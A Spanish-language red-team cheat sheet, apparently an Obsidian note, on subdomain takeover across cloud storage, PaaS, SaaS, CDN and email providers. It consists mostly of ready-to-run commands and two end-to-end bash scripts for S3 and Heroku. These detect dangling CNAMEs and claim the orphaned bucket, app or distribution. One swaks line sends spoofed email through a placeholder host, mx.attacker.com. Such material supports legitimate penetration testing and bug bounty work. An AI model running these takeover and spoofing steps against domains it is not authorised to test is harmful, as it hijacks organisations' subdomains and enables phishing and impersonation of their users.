---
aliases:
  - S3 Takeover
  - GitHub Pages Takeover
  - Heroku Takeover
  - Azure Takeover
  - CloudFront Takeover
tags:
  - vuln/subdomain-takeover
  - technique/initial-access
  - asset/cloud
  - asset/dns
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Subdomain Takeover]]"
---
# Subdomain Takeover - Tipos por Servicio

---

## Cloud Storage (S3 / Azure Blob / GCS)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short CNAME vulnerable.target.com \| grep -i 's3.amazonaws.com'` | Confirma CNAME a S3 | Pre-takeover detection. |
| `curl -s "https://vulnerable.target.com" \| grep -q "NoSuchBucket"` | Detecta bucket dangling | Standard S3 indicator. |
| `aws s3api create-bucket --bucket victim-bucket --region us-east-1` | Reclama bucket S3 | Bucket name no taken. |
| `aws s3 website "s3://victim-bucket/" --index-document index.html` | Habilita static site hosting | Post-create. |
| `echo "<h1>Takeover PoC</h1>" > index.html && aws s3 cp index.html "s3://victim-bucket/" --acl public-read` | Subir contenido al bucket reclamado | Verification step. |
| `dig +short CNAME vulnerable.target.com \| grep -i 'blob.core.windows.net'` | Detecta Azure Blob CNAME | Azure storage. |
| `az storage account create --name victimaccount --resource-group rg --location eastus --sku Standard_LRS` | Reclama Azure storage account | Azure CLI. |
| `gsutil mb gs://victim-bucket` | Reclama GCS bucket | GCP storage. |
| `for s in s3.amazonaws.com blob.core.windows.net storage.googleapis.com digitaloceanspaces.com wasabisys.com s3.backblazeb2.com; do dig +short CNAME victim.target.com \| grep -i "$s"; done` | Probe múltiples cloud providers | Discovery. |
^sdt-types-storage

### S3 takeover end-to-end

```bash
SUB="vulnerable.target.com"
CNAME=$(dig +short CNAME "$SUB")

curl -s "https://$SUB" | grep -q "NoSuchBucket" && echo "[+] Vulnerable"

BUCKET=$(echo "$CNAME" | cut -d. -f1)
aws s3api create-bucket --bucket "$BUCKET" --region us-east-1
aws s3 website "s3://$BUCKET/" --index-document index.html
echo "<h1>SDT PoC</h1>" > index.html
aws s3 cp index.html "s3://$BUCKET/" --acl public-read

curl -s "https://$SUB"  # → atacante's content
```

---

## PaaS (Heroku / Netlify / Vercel / Fastly)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s "https://docs.target.com" \| grep -qi "no such app\|herokuapp"` | Detecta Heroku dangling | Heroku indicator. |
| `heroku create dangling-app-name && heroku domains:add docs.target.com` | Reclama Heroku app + add custom domain | Standard takeover. |
| `git init && echo "<h1>Take</h1>" > index.html && git add . && git commit -m "PoC" && git push heroku main` | Deploy contenido | Post-create. |
| `curl -s "https://target.com" \| grep -qi "page not found\|netlify"` | Detecta Netlify dangling | Netlify indicator. |
| `netlify init && netlify domains:add target.com` | Reclama Netlify + custom domain | Free tier. |
| `vercel --confirm && vercel domains add target.com` | Reclama Vercel | Free tier. |
| `surge --domain target.com` | Reclama Surge.sh | Trivial. |
| `for s in herokuapp.com netlify.app vercel.app fastly.net onrender.com pantheonsite.io surge.sh bitbucket.io webflow.io; do dig +short CNAME victim.target.com \| grep -i "$s"; done` | Probe PaaS providers | Bulk discovery. |
^sdt-types-paas

### Heroku takeover

```bash
SUB="docs.target.com"
curl -s "https://$SUB" | grep -q "no-such-app.herokuapp.com" && echo "[+] Heroku takeover"

CNAME=$(dig +short CNAME "$SUB")
APP=$(echo "$CNAME" | cut -d. -f1)
heroku create "$APP"
heroku domains:add "$SUB"

git init
echo "<h1>SDT PoC</h1>" > index.html
git add . && git commit -m "PoC"
git push heroku main

curl -s "https://$SUB"
```

---

## SaaS (GitHub Pages / Tumblr / Shopify / Zendesk)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s "https://docs.target.com" \| grep -qi "there isn't a github pages site here"` | Detecta GitHub Pages dangling | GH Pages indicator. |
| `gh repo create username/dangling-repo --public && cd dangling-repo && echo "docs.target.com" > CNAME && git add CNAME && git commit -m "Pages" && git push` | Reclama GitHub Pages con CNAME | GH CLI. |
| Browser → Settings → Pages → enable | Activate GH Pages | Post-CNAME push. |
| `curl -s "https://target.com" \| grep -qi "tumblr"` | Detecta Tumblr dangling | Tumblr SaaS. |
| Sign up Tumblr → Settings → Add custom domain | Reclama Tumblr blog | Manual web. |
| `curl -s "https://target.com" \| grep -qi "shopify"` | Detecta Shopify dangling | Shopify indicator. |
| Shopify admin → Settings → Domains → Connect existing domain | Reclama Shopify store | Manual + paid trial. |
| `curl -s "https://help.target.com" \| grep -qi "zendesk"` | Detecta Zendesk dangling | Zendesk help center. |
| Zendesk admin → Settings → Host mapping → Add subdomain | Reclama Zendesk host | Manual + signup. |
| `for s in github.io tumblr.com myshopify.com zendesk.com wordpress.com tilda.ws strikingly.com webflow.com readme.io statuspage.io; do dig +short CNAME victim.target.com \| grep -i "$s"; done` | Probe SaaS providers | Bulk discovery. |
^sdt-types-saas

---

## CDN Dangling (CloudFront / Cloudflare)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short CNAME victim.target.com \| grep -i cloudfront.net` | Detecta CloudFront CNAME | CDN dangling. |
| `curl -sI "https://victim.target.com" \| grep -i 'x-amz-cf'` | Confirma CloudFront origin | Header indicator. |
| `aws cloudfront create-distribution --origin-domain-name x.s3.amazonaws.com --aliases "victim.target.com"` | Reclama CloudFront distribution con alt domain | CloudFront takeover. |
| `aws acm request-certificate --domain-name victim.target.com --validation-method DNS` | Request SSL cert para alt domain | Pre-distribution config. |
| `dig +short CNAME victim.target.com \| grep -i workers.dev` | Detecta Cloudflare Workers dangling | CF workers. |
| `wrangler init dangling-name && wrangler publish` | Reclama CF Worker | Wrangler CLI. |
| `dig +short CNAME victim.target.com \| grep -i pages.dev` | Detecta Cloudflare Pages dangling | CF Pages. |
| `for s in cloudfront.net workers.dev pages.dev fastly.net azureedge.net akamaihd.net kxcdn.com; do dig +short CNAME victim.target.com \| grep -i "$s"; done` | Probe CDN providers | Bulk discovery. |
^sdt-types-cdn

---

## Email / Domain Providers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short MX target.com` | MX records list — buscar dangling | Email infrastructure recon. |
| `dig +short TXT target.com \| grep -i spf` | SPF includes — verificar referenced services | SPF abuse setup. |
| `host mail.target.com` o `dig +short A mail.target.com` | Si MX apunta a IP no asignada | Email takeover candidate. |
| `dig +short CNAME _domainkey.target.com` | DKIM dangling check | DKIM spoofing. |
| `whois target.com \| grep -iE 'registrar\|expir'` | Registrar + expiration | Domain expired squatting. |
| Sign up Mailgun/SendGrid con dangling subdomain | Reclama email provider account | Email send/receive takeover. |
| `swaks --to admin@target.com --from atacante@target.com --server mx.attacker.com` | Test email spoofing post-MX takeover | Email spoofing PoC. |
| `nslookup -type=mx target.com` | Quick MX lookup | Recon. |
^sdt-types-email

---
